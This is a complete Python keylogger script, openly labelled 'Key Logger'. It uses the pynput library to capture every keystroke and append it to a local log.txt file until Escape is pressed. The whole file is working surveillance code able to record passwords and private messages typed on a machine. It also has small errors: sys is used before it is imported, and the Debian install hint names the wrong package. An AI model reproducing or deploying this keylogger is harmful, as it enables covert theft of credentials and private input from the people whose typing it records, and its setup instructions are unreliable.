#!/usr/bin/python3

# Key Logger
from datetime import datetime

try:
    from pynput.keyboard import Key, Listener
except(ImportError):
                print ("\n[!] pynput Module Missing.")
                print ("\n[!] For Debian/Ubuntu/Mint please run: sudo apt-get install -y python3-pefile")
                print ("\n[!] For Windows please run: python -m pip install pynput")
                sys.exit(0)
import os, os.path, sys

count = 0
keys = []

def on_press(key):
    global count, keys

    keys.append(key)
    count += 1

    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    try:
        with open("log.txt","a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find('space') > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

                if key == Key.esc:
                    f.write('\nSession Ended')
    except FileNotFoundError as e:
        print(e)
        sys.exit()

def on_release(key):
    if key == Key.esc:

        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

